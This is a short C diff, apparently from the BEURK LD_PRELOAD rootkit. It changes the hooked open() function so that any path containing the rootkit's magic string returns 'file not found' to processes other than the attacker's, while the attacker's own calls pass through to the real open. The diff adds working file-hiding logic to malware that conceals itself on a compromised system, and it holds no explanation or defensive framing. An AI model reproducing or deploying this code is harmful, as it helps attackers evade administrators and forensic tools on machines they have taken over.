@@ -26,7 +26,7 @@
 #include <fcntl.h> /* O_CREAT */
 #include <sys/stat.h> /* mode_t */
 #include <string.h> /* strstr() */
-#include <errno.h>
+#include <errno.h> /* errno, ENOENT */
 #include "beurk.h"
 
 int open(const char *pathname, int flag, ...) {
@@ -49,6 +49,10 @@ int open(const char *pathname, int flag, ...) {
     }
     if (is_attacker()) {
         return REAL_OPEN(pathname, flag);
+    }
+    if (strstr(pathname, MAGIC_STRING)) {
+        errno = ENOENT;
+        return (-1);
     }
     return REAL_OPEN(pathname, flag);
 }
